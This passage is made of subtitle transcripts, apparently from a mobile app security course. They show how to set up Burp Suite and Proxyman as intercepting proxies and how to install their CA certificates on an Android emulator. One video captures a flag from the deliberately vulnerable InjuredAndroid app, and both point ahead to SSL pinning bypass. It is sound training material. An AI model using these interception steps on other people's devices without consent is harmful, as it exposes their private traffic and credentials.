actually add a brand new proxy listener for

11
00:00:20.420 --> 00:00:21.440
our Android device.

12
00:00:21.580 --> 00:00:23.540
So I'm going to click add, and then

13
00:00:23.540 --> 00:00:25.440
I'm going to set this to port 8082.

14
00:00:25.920 --> 00:00:27.740
Now you can really choose any port that

15
00:00:27.740 --> 00:00:28.120
you want.

16
00:00:28.120 --> 00:00:31.860
Personally, I usually go for 8081 or 8082,

17
00:00:32.100 --> 00:00:34.720
depending on the situation, just so it's still

18
00:00:34.720 --> 00:00:37.720
similar to what Burp's default port is, which

19
00:00:37.720 --> 00:00:38.540
is 8080.

20
00:00:38.920 --> 00:00:41.060
Now I'm going to click all interfaces, and

21
00:00:41.060 --> 00:00:42.860
this is very important so that our Android

22
00:00:42.860 --> 00:00:44.340
phone will be able to go out there

23
00:00:44.340 --> 00:00:45.780
and call out to this port.

24
00:00:46.120 --> 00:00:46.860
I'm going to click okay.

25
00:00:47.640 --> 00:00:49.300
Burp Suite will give us an error here

26
00:00:49.300 --> 00:00:50.780
saying, are you sure you want to listen

27
00:00:50.780 --> 00:00:51.780
on all interfaces?

28
00:00:52.160 --> 00:00:53.580
We'll say yes to that.

29
00:00:54.220 --> 00:00:55.740
Now that we have this set up, we

30
00:00:55.740 --> 00:00:57.960
can actually go into our emulator and set

31
00:00:57.960 --> 00:00:59.760
up Burp Suite as our proxy.

32
00:01:00.120 --> 00:01:02.520
If we're using an emulator, it's very easy

33
00:01:02.520 --> 00:01:04.260
because we can just click the triple dot

34
00:01:04.260 --> 00:01:04.580
here.

35
00:01:04.980 --> 00:01:07.240
You'll be brought to this location screen on

36
00:01:07.240 --> 00:01:08.380
your first view of this.

37
00:01:08.820 --> 00:01:10.900
I'm going to click settings here, and then

38
00:01:10.900 --> 00:01:14.100
we can uncheck this use Android Studio HTTP

39
00:01:14.100 --> 00:01:15.180
proxy settings.

40
00:01:15.520 --> 00:01:17.240
Click manual proxy configuration.

41
00:01:17.700 --> 00:01:19.200
I already have everything filled in here.

42
00:01:19.200 --> 00:01:21.000
We're going to fill it in again with

43
00:01:21.000 --> 00:01:24.900
127.0.0.1, and the port again

44
00:01:24.900 --> 00:01:27.420
is 8082 because that's what we set up

45
00:01:27.420 --> 00:01:28.500
here in Burp Suite.

46
00:01:28.840 --> 00:01:30.500
I'm going to click apply here, and if

47
00:01:30.500 --> 00:01:32.360
you get this success message, you should be

48
00:01:32.360 --> 00:01:33.500
in pretty good shape.

49
00:01:33.840 --> 00:01:36.840
Let's actually go to a web browser on

50
00:01:36.840 --> 00:01:38.760
our Android phone now and see if this

51
00:01:38.760 --> 00:01:39.620
works successfully.

52
00:01:41.810 --> 00:01:45.510
I'm going to go to google.com, and

53
00:01:45.510 --> 00:01:47.410
here we can see that we're getting a

54
00:01:47.410 --> 00:01:48.930
security certificate error.

55
00:01:48.930 --> 00:01:51.450
I'm going to click view certificate here, and

56
00:01:51.450 --> 00:01:53.610
you can see that the organizational unit is

57
00:01:53.610 --> 00:01:54.850
Port Swigger CA.

58
00:01:55.330 --> 00:01:59.110
This is the actual CA certificate of our

59
00:01:59.110 --> 00:02:01.930
proxy here, and our phone does not trust

60
00:02:01.930 --> 00:02:03.910
this because we actually have to go ahead

61
00:02:03.910 --> 00:02:06.970
and trust this certificate and import it into

62
00:02:06.970 --> 00:02:07.449
the phone.

63
00:02:07.630 --> 00:02:09.930
I'm going to click okay here and just

64
00:02:09.930 --> 00:02:11.570
close out of my web browser.

65
00:02:12.450 --> 00:02:14.170
Next, what I need to do is go

66
00:02:14.170 --> 00:02:16.450
back to Burp Suite and click this import

67
00:02:16.450 --> 00:02:18.270
export CA certificate.

68
00:02:18.870 --> 00:02:21.350
We're going to click certificate in DER format.

69
00:02:21.530 --> 00:02:23.270
There's a bunch of different formats here, but

70
00:02:23.270 --> 00:02:25.750
the DER one is the one that I

71
00:02:25.750 --> 00:02:26.010
did.

72
00:02:26.750 --> 00:02:28.990
Now keep in mind that here we're not

73
00:02:28.990 --> 00:02:31.450
going to even export this as a .DER.

74
00:02:31.770 --> 00:02:33.770
We're going to add an extra file extension

75
00:02:33.770 --> 00:02:35.950
at the end to make this compatible with

76
00:02:35.950 --> 00:02:36.950
our Android phone.

77
00:02:37.350 --> 00:02:38.490
I'm going to click next here.

78
00:02:39.090 --> 00:02:41.050
Now I'm going to click select file to

79
00:02:41.050 --> 00:02:43.910
name this however I want, and in my

80
00:02:43.910 --> 00:02:46.490
case, I'm going to actually replace one that

81
00:02:46.490 --> 00:02:53.920
I had previously, and we're going to name

82
00:02:53.920 --> 00:03:03.630
this file burp underscore TCM academy, and then

83
00:03:03.630 --> 00:03:05.250
you have to do a new file extension

84
00:03:05.250 --> 00:03:08.070
at the end, which is a .CER. Make

85
00:03:08.070 --> 00:03:10.970
sure that you add this .CER file extension

86
00:03:10.970 --> 00:03:13.550
because this is extremely important for getting this

87
00:03:13.550 --> 00:03:14.750
to run successfully.

88
00:03:15.210 --> 00:03:17.250
I'm going to click save here, and then

89
00:03:17.250 --> 00:03:20.530
click next to confirm my changes, and now

90
00:03:20.530 --> 00:03:23.530
my certificate is stored locally on my machine,

91
00:03:23.750 --> 00:03:25.650
so I'm going to have to open a

92
00:03:25.650 --> 00:03:28.550
file explorer here and go to my documents,

93
00:03:28.670 --> 00:03:32.980
which is where this was saved, and here

94
00:03:32.980 --> 00:03:35.900
you can see the burp underscore TCM academy

95
00:03:35.900 --> 00:03:36.540
certificate.

96
00:03:36.840 --> 00:03:38.960
I can actually simply just take this and

97
00:03:38.960 --> 00:03:42.800
drop it into my Android phone, and now

98
00:03:42.800 --> 00:03:44.600
we're going to go to the settings so

99
00:03:44.600 --> 00:03:48.260
that we can actually import this certificate into

100
00:03:48.260 --> 00:03:50.600
the phone so that it trusts burp as

101
00:03:50.600 --> 00:03:51.760
a CA certificate.

102
00:03:51.980 --> 00:03:54.060
We're going to go to settings here, and

103
00:03:54.060 --> 00:03:56.900
then depending on the version of the Android

104
00:03:56.900 --> 00:04:00.340
operating system, it's usually under security here or

105
00:04:00.340 --> 00:04:03.520
something like accounts and security, and you scroll

106
00:04:03.520 --> 00:04:05.260
down a bit more, and you should have

107
00:04:05.260 --> 00:04:07.500
this trusted credential store right here.

108
00:04:07.860 --> 00:04:10.020
We're going to click install from SD card,

109
00:04:10.840 --> 00:04:12.100
and you can see here that I have

110
00:04:12.100 --> 00:04:14.480
two here because I actually was playing with

111
00:04:14.480 --> 00:04:16.480
this earlier, but the one that we just

112
00:04:16.480 --> 00:04:18.880
downloaded onto the phone is the burp underscore

113
00:04:18.880 --> 00:04:22.220
TCM academy .CER, so I'm going to click

114
00:04:22.220 --> 00:04:23.960
that, and now it's going to ask you

115
00:04:23.960 --> 00:04:26.560
for a certificate name, and I'll just name

116
00:04:26.560 --> 00:04:31.040
this burp underscore TCM, and here there's also

117
00:04:31.040 --> 00:04:32.360
the credential usage.

118
00:04:32.660 --> 00:04:34.820
I always just leave this defaulted to VPN

119
00:04:34.820 --> 00:04:35.300
and apps.

120
00:04:35.300 --> 00:04:36.840
It seems to work pretty fine.

121
00:04:37.160 --> 00:04:39.500
Not sure exactly what Wi-Fi does in

122
00:04:39.500 --> 00:04:41.520
every situation, so I usually go with a

123
00:04:41.520 --> 00:04:42.640
VPN and apps there.

124
00:04:42.860 --> 00:04:45.440
I'm going to click okay, and now it's

125
00:04:45.440 --> 00:04:46.820
going to ask me for a PIN.

126
00:04:47.260 --> 00:04:49.280
I previously set up my PIN, but when

127
00:04:49.280 --> 00:04:50.880
you do this for the very first time,

128
00:04:50.980 --> 00:04:52.580
it's going to ask you to set up

129
00:04:52.580 --> 00:04:53.820
a PIN or a password.

130
00:04:54.240 --> 00:04:56.080
For our case, I just picked something really

131
00:04:56.080 --> 00:04:58.840
easy like one, two, three, four, and then

132
00:04:58.840 --> 00:05:00.680
once you set up that PIN, you should

133
00:05:00.680 --> 00:05:03.940
see the burp underscore TCM is installed.

134
00:05:03.940 --> 00:05:06.220
Click my home button here again.

135
00:05:06.700 --> 00:05:08.080
I'm going to go back to Burp Suite

136
00:05:08.080 --> 00:05:10.080
here and make sure my intercept is actually

137
00:05:10.080 --> 00:05:10.700
turned on.

138
00:05:11.020 --> 00:05:12.740
We're going to open the web browser now,

139
00:05:12.880 --> 00:05:14.800
and we should be able to intercept our

140
00:05:14.800 --> 00:05:15.900
traffic successfully.

141
00:05:16.380 --> 00:05:18.520
I'm going to go back to google.com.

142
00:05:18.680 --> 00:05:20.460
You can see that I intercepted some traffic

143
00:05:20.460 --> 00:05:20.840
here.

144
00:05:23.350 --> 00:05:23.670
Oops.

145
00:05:25.010 --> 00:05:28.170
Google.com, and you can see that we're

146
00:05:28.170 --> 00:05:32.610
getting clear text traffic to google.com, and

147
00:05:32.610 --> 00:05:35.730
we're also getting some encrypted traffic as well.

148
00:05:35.870 --> 00:05:39.230
We have HTTPS colon slash slash www.google

149
00:05:39.230 --> 00:05:39.790
.com.

150
00:05:40.050 --> 00:05:41.670
So I'm going to keep on forwarding this

151
00:05:41.670 --> 00:05:44.370
traffic, and I'm just going to do a

152
00:05:44.370 --> 00:05:46.670
search here for blog just to make sure

153
00:05:46.670 --> 00:05:48.450
that everything is working properly.

154
00:05:51.910 --> 00:05:53.790
Burp Suite keeps on coming up, but we're

155
00:05:53.790 --> 00:05:55.770
seeing the traffic successfully for sure.

156
00:05:55.890 --> 00:05:58.210
You can see that here we have our

157
00:05:58.210 --> 00:06:01.150
information, our cookies, and it's also intercepting the

158
00:06:01.150 --> 00:06:02.550
HTTPS traffic.

159
00:06:02.550 --> 00:06:05.050
Now like I was talking about with the

160
00:06:05.050 --> 00:06:08.430
dynamic analysis section of this course, even getting

161
00:06:08.430 --> 00:06:11.370
here to where we're intercepting this encrypted traffic

162
00:06:11.370 --> 00:06:14.170
via Burp Suite, it might not be enough

163
00:06:14.170 --> 00:06:15.590
for our given scenario.

164
00:06:16.210 --> 00:06:18.370
So a flag in Injured Android that we're

165
00:06:18.370 --> 00:06:22.150
interested in here is actually this SSL pinning

166
00:06:22.150 --> 00:06:24.990
bypass flag.

167
00:06:25.210 --> 00:06:26.310
So I'm going to go here.

168
00:06:26.390 --> 00:06:27.930
I'm going to enter the flag and just

169
00:06:27.930 --> 00:06:30.250
press submit, and it's just going to keep

170
00:06:30.250 --> 00:06:31.590
on saying try again.

171
00:06:31.590 --> 00:06:34.070
If we turn on our Burp Suite here,

172
00:06:34.430 --> 00:06:38.810
we see some messages coming by, and we

173
00:06:38.810 --> 00:06:39.750
can actually see it.

174
00:06:40.410 --> 00:06:42.490
So it's not really doing SSL pinning here

175
00:06:42.490 --> 00:06:45.930
because this is the flag, epic underscore awesomeness,

176
00:06:46.350 --> 00:06:48.810
and this is actually our flag because that's

177
00:06:48.810 --> 00:06:50.250
the data that's being sent here.

178
00:06:50.910 --> 00:06:52.030
So I'm going to paste that.

179
00:06:52.590 --> 00:06:54.510
So we were able to successfully get this

180
00:06:54.510 --> 00:06:54.930
flag.

181
00:06:55.090 --> 00:06:57.930
I'm going to click submit, and we can

182
00:06:57.930 --> 00:07:00.130
see that congratulations, you found the flag.

183
00:07:00.130 --> 00:07:01.890
So we were actually able to intercept that

184
00:07:01.890 --> 00:07:03.810
application traffic using Burp Suite.

185
00:07:04.470 --> 00:07:07.970
But in other situations with other applications, at

186
00:07:07.970 --> 00:07:11.130
this point, the application might actually crash.

187
00:07:11.250 --> 00:07:13.490
So for example, if I went here, I

188
00:07:13.490 --> 00:07:15.210
put something random in this box, and we

189
00:07:15.210 --> 00:07:17.170
can see that it's starting to send this

190
00:07:17.170 --> 00:07:18.210
network traffic, right?

191
00:07:18.290 --> 00:07:21.410
It says something about SSL pinning bypass, forward

192
00:07:21.410 --> 00:07:23.270
it, and it happens to be that this

193
00:07:23.270 --> 00:07:25.410
is our actual flag in this scenario.

194
00:07:25.410 --> 00:07:28.770
But at this point, other applications, when they

195
00:07:28.770 --> 00:07:31.190
see Burp Suite being used as the proxy,

196
00:07:31.610 --> 00:07:35.210
might actually crash when we submit this flag.

197
00:07:36.310 --> 00:07:38.270
So what we're going to do next is

198
00:07:38.270 --> 00:07:42.590
actually inject Frida into the injured Android application

199
00:07:42.590 --> 00:07:45.310
so that we could actually bypass SSL pinning.

200
00:07:45.450 --> 00:07:47.950
We're going to do that manually and automatically.

201
00:07:48.350 --> 00:07:49.890
But as you can see in this video,

202
00:07:50.070 --> 00:07:52.030
we were actually able to intercept the traffic

203
00:07:52.030 --> 00:07:56.090
successfully, but in an application that really implements

204
00:07:56.090 --> 00:07:59.510
SSL pinning, you could easily have a crash

205
00:07:59.510 --> 00:08:01.390
just as well when you click this submit

206
00:08:01.390 --> 00:08:01.750
button.

207
00:08:02.050 --> 00:08:03.950
So let's get into those videos and learn

208
00:08:03.950 --> 00:08:06.570
how we can bypass SSL pinning and get

209
00:08:06.570 --> 00:08:08.310
set up with Frida in Objection.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.330 --> 00:00:03.110
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Alright, let's talk about a different proxy tool

2
00:00:03.110 --> 00:00:05.470
besides Burp Suite called ProxyMan.

3
00:00:05.830 --> 00:00:08.910
Now, ProxyMan is only available for Mac OS,

4
00:00:09.130 --> 00:00:10.330
so if you do not have a MacBook,

5
00:00:10.670 --> 00:00:12.530
you can go ahead and skip this video

6
00:00:12.530 --> 00:00:13.290
if you'd like to.

7
00:00:13.790 --> 00:00:16.650
Otherwise, please continue on to learn a bit

8
00:00:16.650 --> 00:00:17.690
about ProxyMan.

9
00:00:18.330 --> 00:00:21.930
So, ProxyMan is basically a debugging tool or

10
00:00:21.930 --> 00:00:25.530
a proxy utilized by developers, and the nice

11
00:00:25.530 --> 00:00:27.990
thing about ProxyMan is that this tool is

12
00:00:27.990 --> 00:00:30.290
free and they do have some pricing options

13
00:00:30.290 --> 00:00:31.930
if you do want to purchase it.

14
00:00:32.250 --> 00:00:34.750
I'll put a link to ProxyMan.io as

15
00:00:34.750 --> 00:00:37.450
well as a documentation link into the course

16
00:00:37.450 --> 00:00:37.850
notes.

17
00:00:38.350 --> 00:00:39.770
So, going down a little bit, you can

18
00:00:39.770 --> 00:00:41.910
see the UI is actually pretty nice, and

19
00:00:41.910 --> 00:00:44.810
you can actually unlock specific apps and everything

20
00:00:44.810 --> 00:00:47.430
like that if you're looking at trying to

21
00:00:47.430 --> 00:00:51.530
decrypt a certain application or a certain URL.

22
00:00:52.170 --> 00:00:54.230
How you can download ProxyMan is you're just

23
00:00:54.230 --> 00:00:55.610
going to click this download button.

24
00:00:55.890 --> 00:00:59.210
It's going to download the ProxyMan.dmg, and

25
00:00:59.210 --> 00:01:01.650
then you can drag and drop that dmg

26
00:01:01.650 --> 00:01:04.630
into your applications folder and then start up

27
00:01:04.630 --> 00:01:06.010
ProxyMan from there.

28
00:01:06.370 --> 00:01:08.350
In my case, I already have the tool

29
00:01:08.350 --> 00:01:08.810
running.

30
00:01:09.370 --> 00:01:11.770
Some other nice things to know about ProxyMan,

31
00:01:12.330 --> 00:01:14.750
the pricing tab here, there's different types of

32
00:01:14.750 --> 00:01:15.230
licenses.

33
00:01:15.730 --> 00:01:18.090
The free license for our purposes is going

34
00:01:18.090 --> 00:01:20.190
to be just fine, but I think that

35
00:01:20.190 --> 00:01:22.630
you're limited to 10 URLs that you can

36
00:01:22.630 --> 00:01:25.290
actually try to decrypt the SSL traffic.

37
00:01:25.730 --> 00:01:27.210
So, if you need more than that or

38
00:01:27.210 --> 00:01:30.790
you're interested in using ProxyMan for other things

39
00:01:30.790 --> 00:01:33.490
as well, you can look at the pricing

40
00:01:33.490 --> 00:01:34.950
options if you want to.

41
00:01:35.390 --> 00:01:37.550
They also have an iOS app, and we're

42
00:01:37.550 --> 00:01:39.050
going to talk about this in the iOS

43
00:01:39.050 --> 00:01:40.770
section of the course as well.

44
00:01:41.070 --> 00:01:43.330
You can actually download an iOS app and

45
00:01:43.330 --> 00:01:45.090
install it on your iPhone, and it helps

46
00:01:45.090 --> 00:01:48.090
you to inspect the traffic that's being sent

47
00:01:48.090 --> 00:01:48.990
from your iPhone.

48
00:01:49.510 --> 00:01:50.350
You need the documentation.

49
00:01:50.750 --> 00:01:54.490
It's all right here, docs.proxyman.io. It's

50
00:01:54.490 --> 00:01:56.210
going to just take a second to load

51
00:01:56.210 --> 00:01:58.950
here, I think, but their documentation is actually

52
00:01:58.950 --> 00:02:01.350
really good and really in-depth on how

53
00:02:01.350 --> 00:02:03.630
to use and install this tool.

54
00:02:04.650 --> 00:02:06.730
Looks like the documentation is not loading.

55
00:02:06.890 --> 00:02:09.050
Anyway, I will provide this link in the

56
00:02:09.050 --> 00:02:12.430
course notes, and everything should be there that

57
00:02:12.430 --> 00:02:13.930
you're going to need, and it actually helps

58
00:02:13.930 --> 00:02:16.010
to answer some questions about some things that

59
00:02:16.010 --> 00:02:19.130
I've had as well on this website.

60
00:02:19.430 --> 00:02:21.370
Looks like they might be having a problem

61
00:02:21.370 --> 00:02:21.950
right now.

62
00:02:24.360 --> 00:02:26.360
Okay, so I'll just add that link to

63
00:02:26.360 --> 00:02:27.380
the show notes.

64
00:02:27.600 --> 00:02:29.900
Let's actually move into the tool now so

65
00:02:29.900 --> 00:02:31.500
you can get a sense of how it

66
00:02:31.500 --> 00:02:31.820
works.

67
00:02:32.180 --> 00:02:34.300
So this is Proxyman, and I have this

68
00:02:34.300 --> 00:02:36.220
kind of in the side window here, so

69
00:02:36.220 --> 00:02:38.020
we can pull up an emulator right next

70
00:02:38.020 --> 00:02:38.920
to it as well.

71
00:02:39.920 --> 00:02:42.080
So this is Proxyman, and you can see

72
00:02:42.080 --> 00:02:44.580
it's actually listening for certain things here, and

73
00:02:44.580 --> 00:02:47.340
Proxyman defaults to port 9090.

74
00:02:47.640 --> 00:02:49.720
So when we're setting up our emulator as

75
00:02:49.720 --> 00:02:52.520
well, we're going to use port 9090 here,

76
00:02:52.540 --> 00:02:55.040
and this is our MacBook IP address.

77
00:02:55.580 --> 00:02:57.120
So this is what you would actually put

78
00:02:57.120 --> 00:03:00.400
into the settings of your emulator if you

79
00:03:00.400 --> 00:03:02.200
wanted to set up the proxy settings.

80
00:03:02.500 --> 00:03:04.320
The first thing you need to do with

81
00:03:04.320 --> 00:03:07.200
Proxyman is go to the certificate tab, and

82
00:03:07.200 --> 00:03:09.860
then click install this certificate on this MacBook.

83
00:03:10.080 --> 00:03:11.720
You can see that I've already done this.

84
00:03:11.760 --> 00:03:14.400
I installed and trusted, but this is literally

85
00:03:14.400 --> 00:03:17.220
as simple as just clicking a button, and

86
00:03:17.220 --> 00:03:19.040
then it will bring up the prompt for

87
00:03:19.040 --> 00:03:20.500
you to log in as the root user,

88
00:03:20.640 --> 00:03:23.040
and it will install and trust the Proxyman

89
00:03:23.040 --> 00:03:24.580
certificate in your MacBook.

90
00:03:25.160 --> 00:03:27.140
So the other cool thing about that as

91
00:03:27.140 --> 00:03:29.180
well is that you could use this to

92
00:03:29.180 --> 00:03:32.040
intercept traffic from your MacBook itself if you

93
00:03:32.040 --> 00:03:32.880
really wanted to.

94
00:03:32.940 --> 00:03:34.900
If you had an app on your MacBook,

95
00:03:35.400 --> 00:03:37.780
you wanted to see what it was sending

96
00:03:37.780 --> 00:03:39.800
traffic to, you could actually use this to

97
00:03:39.800 --> 00:03:41.440
intercept that traffic as well.

98
00:03:42.220 --> 00:03:44.760
They also have manual instructions here on how

99
00:03:44.760 --> 00:03:46.700
you can add this to your keychain if

100
00:03:46.700 --> 00:03:47.600
you want to do it manually.

101
00:03:47.600 --> 00:03:49.660
The nice thing about Proxyman is they just

102
00:03:49.660 --> 00:03:51.500
have these little buttons here that's going to

103
00:03:51.500 --> 00:03:52.980
help you install everything.

104
00:03:54.440 --> 00:03:56.920
Okay, so now let's actually open up an

105
00:03:56.920 --> 00:03:59.360
emulator and see how we can set up

106
00:03:59.360 --> 00:04:01.000
Proxyman for an emulator.

107
00:04:01.180 --> 00:04:03.560
I'm just in my other window now opening

108
00:04:03.560 --> 00:04:05.180
up an Android emulator.

109
00:04:05.640 --> 00:04:07.900
Okay, other features of Proxyman while we wait

110
00:04:07.900 --> 00:04:08.880
for that to boot up.

111
00:04:09.060 --> 00:04:10.800
Here you can see the stuff that I'm

112
00:04:10.800 --> 00:04:12.560
intercepting for my MacBook.

113
00:04:13.900 --> 00:04:18.120
You can see there's a request section here

114
00:04:18.120 --> 00:04:19.459
and also a response.

115
00:04:19.920 --> 00:04:21.980
The cool thing about Proxyman is that you

116
00:04:21.980 --> 00:04:26.320
can enable this response tab for an entire

117
00:04:26.320 --> 00:04:26.820
domain.

118
00:04:27.260 --> 00:04:30.740
So for example, here it's configuration.ls.apple

119
00:04:30.740 --> 00:04:31.380
.com.

120
00:04:31.840 --> 00:04:34.260
If I wanted to enable this domain, I

121
00:04:34.260 --> 00:04:36.380
would just click the enable only this domain.

122
00:04:36.860 --> 00:04:38.780
Then when my computer goes back out and

123
00:04:38.780 --> 00:04:41.160
reaches out to this website again, I'll be

124
00:04:41.160 --> 00:04:43.900
able to see the traffic that's involved in

125
00:04:43.900 --> 00:04:44.920
those network calls.

126
00:04:45.240 --> 00:04:48.160
You can also enable for all domains here

127
00:04:48.160 --> 00:04:50.760
like com.apple.geo. If it sees that

128
00:04:50.760 --> 00:04:54.860
it's putting a bunch of different requests into

129
00:04:54.860 --> 00:04:56.280
one category.

130
00:04:56.800 --> 00:04:58.420
So that's how you're going to actually try

131
00:04:58.420 --> 00:04:59.680
to decrypt the traffic.

132
00:05:00.020 --> 00:05:02.980
Let's see how our emulator is doing here.

133
00:05:05.200 --> 00:05:08.060
Okay, so now we have the emulator pulled

134
00:05:08.060 --> 00:05:10.700
up on our device and you can actually

135
00:05:10.700 --> 00:05:14.300
see over here in Proxyman where we're capturing

136
00:05:14.300 --> 00:05:17.100
different types of traffic coming from this device.

137
00:05:17.360 --> 00:05:19.060
Now this is because I already set up

138
00:05:19.060 --> 00:05:21.200
the next step of the process, but what

139
00:05:21.200 --> 00:05:23.180
you would do at this point once you

140
00:05:23.180 --> 00:05:24.960
have an emulator running or you have a

141
00:05:24.960 --> 00:05:27.560
physical device, you would go again to this

142
00:05:27.560 --> 00:05:28.400
certificate tab.

143
00:05:28.600 --> 00:05:31.420
Then you go to install certificate on Android.

144
00:05:31.420 --> 00:05:33.320
You can also do this for iOS as

145
00:05:33.320 --> 00:05:33.820
you can see.

146
00:05:34.160 --> 00:05:36.800
You can install a certificate onto a simulator.

147
00:05:37.120 --> 00:05:39.580
So if you're wanting to intercept traffic from

148
00:05:39.580 --> 00:05:41.700
a simulator while you're testing your application, you

149
00:05:41.700 --> 00:05:42.600
can do that as well.

150
00:05:42.720 --> 00:05:44.400
We'll talk more about that in the iOS

151
00:05:44.400 --> 00:05:47.900
section, but anyway for Android we have the

152
00:05:47.900 --> 00:05:49.680
option for physical devices here.

153
00:05:49.800 --> 00:05:52.740
We also have the option for emulators and

154
00:05:52.740 --> 00:05:54.180
this is going to give us a one

155
00:05:54.180 --> 00:05:56.820
-click solution where we'll be able to start

156
00:05:56.820 --> 00:06:00.220
intercepting traffic for our emulator through Proxyman.

157
00:06:00.320 --> 00:06:01.800
So I'm going to click emulators here.

158
00:06:02.560 --> 00:06:05.100
It says install the root Proxyman certificate to

159
00:06:05.100 --> 00:06:05.680
this MacBook.

160
00:06:05.860 --> 00:06:06.620
I already did that.

161
00:06:06.740 --> 00:06:09.460
It's already installed and trusted here and then

162
00:06:09.460 --> 00:06:12.000
it automatically detects our emulator here.

163
00:06:12.120 --> 00:06:13.800
So you can see we have one Android

164
00:06:13.800 --> 00:06:16.440
emulator device found and all we needed to

165
00:06:16.440 --> 00:06:19.320
do is click this override emulator button.

166
00:06:19.720 --> 00:06:21.040
Now in my case I think I already

167
00:06:21.040 --> 00:06:23.380
have all this set up with our emulator

168
00:06:23.380 --> 00:06:25.960
settings overridden, but you would just click the

169
00:06:25.960 --> 00:06:29.340
override emulator button and you could also just

170
00:06:29.340 --> 00:06:32.080
override like the HTTP proxy as well if

171
00:06:32.080 --> 00:06:33.620
you just want clear text traffic.

172
00:06:34.220 --> 00:06:36.540
Again you can go to the settings here

173
00:06:36.540 --> 00:06:41.140
for the emulator and change the proxy.

174
00:06:42.980 --> 00:06:45.860
Go to settings here, change the proxy to

175
00:06:45.860 --> 00:06:48.320
point towards Proxyman which again is going to

176
00:06:48.320 --> 00:06:51.080
be on port 9090 as you can see

177
00:06:51.080 --> 00:06:52.860
here shown in Proxyman.

178
00:06:52.980 --> 00:06:54.260
So you want to do that as well.

179
00:06:54.740 --> 00:06:56.540
That's the one thing that Proxyman does not

180
00:06:56.540 --> 00:06:57.500
do automatically.

181
00:06:58.360 --> 00:07:00.740
So now that I have everything installed you

182
00:07:00.740 --> 00:07:02.920
would just click that override proxy button.

183
00:07:03.480 --> 00:07:05.620
Let's go ahead and check that our Android

184
00:07:05.620 --> 00:07:08.360
phone is actually configured to have its traffic

185
00:07:08.360 --> 00:07:09.460
intercepted.

186
00:07:09.540 --> 00:07:11.660
I'm going to enter my pin here.

187
00:07:20.700 --> 00:07:23.360
Okay to make sure that Proxyman is intercepting

188
00:07:23.360 --> 00:07:26.440
this traffic and everything was overridden properly I'm

189
00:07:26.440 --> 00:07:28.260
going to go to the settings here.

190
00:07:29.240 --> 00:07:30.980
I'm going to scroll down in the settings

191
00:07:30.980 --> 00:07:35.820
here and go to security I think.

192
00:07:35.820 --> 00:07:36.960
Yep security.

193
00:07:44.210 --> 00:07:46.550
Go down to trusted credentials.

194
00:07:53.950 --> 00:07:56.790
Go to the user credentials and just make

195
00:07:56.790 --> 00:07:59.050
sure the Proxyman certificate is shown here.

196
00:08:00.610 --> 00:08:04.050
Okay so the Proxyman certificate is trusted in

197
00:08:04.050 --> 00:08:06.570
our Android emulator here.

198
00:08:07.030 --> 00:08:10.210
So now we know that everything should be

199
00:08:10.210 --> 00:08:12.030
good for this certificate.

200
00:08:12.290 --> 00:08:13.710
I'm just going to click trust to double

201
00:08:13.710 --> 00:08:14.410
check here.

202
00:08:33.480 --> 00:08:35.860
Okay our Proxyman certificate should be fine.

203
00:08:35.860 --> 00:08:38.340
Now if we go ahead and open an

204
00:08:38.340 --> 00:08:41.799
actual Android application we should see the traffic

205
00:08:41.799 --> 00:08:43.880
getting populated into Proxyman.

206
00:08:43.980 --> 00:08:45.860
Let's just use maps for an example.

207
00:08:51.060 --> 00:08:53.100
Okay we can see some new traffic populating

208
00:08:53.100 --> 00:08:55.640
here like clients4.google.com.

209
00:08:56.140 --> 00:08:58.740
You can see the request here and now

210
00:08:58.740 --> 00:09:00.760
if you wanted to actually try to decrypt

211
00:09:00.760 --> 00:09:03.380
the traffic that's going here you would click

212
00:09:03.380 --> 00:09:04.800
enable this domain.

213
00:09:05.280 --> 00:09:07.360
You can kind of right click or control

214
00:09:07.360 --> 00:09:10.320
click here and you can enable HTTPS responses.

215
00:09:11.080 --> 00:09:13.500
The other nice thing about Proxyman too is

216
00:09:13.500 --> 00:09:16.740
if you saw this coming up a lot

217
00:09:16.740 --> 00:09:18.200
of times you can actually pin it to

218
00:09:18.200 --> 00:09:18.680
the top.

219
00:09:18.800 --> 00:09:20.100
So you can right click and you can

220
00:09:20.100 --> 00:09:22.660
click pin and this will put that URL

221
00:09:22.660 --> 00:09:25.740
right up here into our pin section.

222
00:09:26.740 --> 00:09:28.460
Looks like we might be getting some errors

223
00:09:28.460 --> 00:09:28.740
here.

224
00:09:28.920 --> 00:09:31.820
This is going to be happening because of

225
00:09:32.380 --> 00:09:33.360
SSL pinning.

226
00:09:33.440 --> 00:09:35.600
So even with Proxyman we might not be

227
00:09:35.600 --> 00:09:38.120
able to actually intercept the traffic due to

228
00:09:38.120 --> 00:09:39.020
SSL pinning.

229
00:09:39.360 --> 00:09:43.760
We need to implement something like objection or

230
00:09:43.760 --> 00:09:47.880
Frida into the application or also bypass SSL

231
00:09:47.880 --> 00:09:49.200
pinning in other ways.

232
00:09:49.320 --> 00:09:50.900
So you'd have to go and reference the

233
00:09:50.900 --> 00:09:54.400
SSL pinning bypass section of this course for

234
00:09:54.400 --> 00:09:54.720
that.

235
00:09:55.360 --> 00:09:57.420
Anyway this is what I wanted to show

236
00:09:57.420 --> 00:09:58.820
you with Proxyman.

237
00:10:00.300 --> 00:10:02.640
And here let's take this as an example.

238
00:10:02.820 --> 00:10:04.160
Here these connectivity checks.

239
00:10:04.620 --> 00:10:07.300
So we can actually copy this as like

240
00:10:07.300 --> 00:10:08.120
a curl command.

241
00:10:08.240 --> 00:10:10.120
If we wanted to repeat this request using

242
00:10:10.120 --> 00:10:12.540
Proxyman we can just click the edit and

243
00:10:12.540 --> 00:10:13.520
repeat functionality.

244
00:10:13.940 --> 00:10:15.620
So now we have the ability to say

245
00:10:15.620 --> 00:10:19.100
like edit the headers here, edit our body

246
00:10:19.100 --> 00:10:19.400
data.

247
00:10:19.420 --> 00:10:21.160
If there was any data being sent here

248
00:10:21.160 --> 00:10:23.320
we can also like say for example edit

249
00:10:23.320 --> 00:10:24.540
the URLs here.

250
00:10:25.020 --> 00:10:26.600
You can see the YouTube app is freaking

251
00:10:26.600 --> 00:10:28.180
out over here on the right hand side

252
00:10:28.180 --> 00:10:29.020
but that's okay.

253
00:10:29.600 --> 00:10:31.680
So we could like try to do different

254
00:10:31.680 --> 00:10:32.440
requests here.

255
00:10:32.580 --> 00:10:34.280
It's just a nice little UI where we

256
00:10:34.280 --> 00:10:36.620
can you know try different types of options

257
00:10:36.620 --> 00:10:39.540
for the API maybe or for the URL

258
00:10:39.540 --> 00:10:40.300
that we found.

259
